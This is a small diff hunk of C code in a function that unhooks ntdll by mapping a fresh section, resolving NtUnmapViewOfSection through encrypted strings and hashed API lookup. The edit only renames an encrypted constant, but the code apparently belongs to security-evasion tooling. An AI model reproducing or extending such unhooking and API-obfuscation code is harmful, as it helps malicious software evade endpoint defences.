@@ -146,7 +146,7 @@ static int unhook_via_section(void* ntdll_base)
     if (!pNtMapViewOfSection) return 0;
 
     /* Resolve NtUnmapViewOfSection */
-    enc_decrypt(enc_nt_unmap_view, ENC_NT_UNMAP_VIEW_LEN, fn);
+    enc_decrypt(enc_NtUnmapViewOfSection, ENC_NTUNMAPVIEWOFSECTION_LEN, fn);
     h = mirage_encrypted_hash_func(fn);
     void* pNtUnmapViewOfSection = mirage_get_function_by_hash(ntdll_base, h);
     if (!pNtUnmapViewOfSection) return 0;
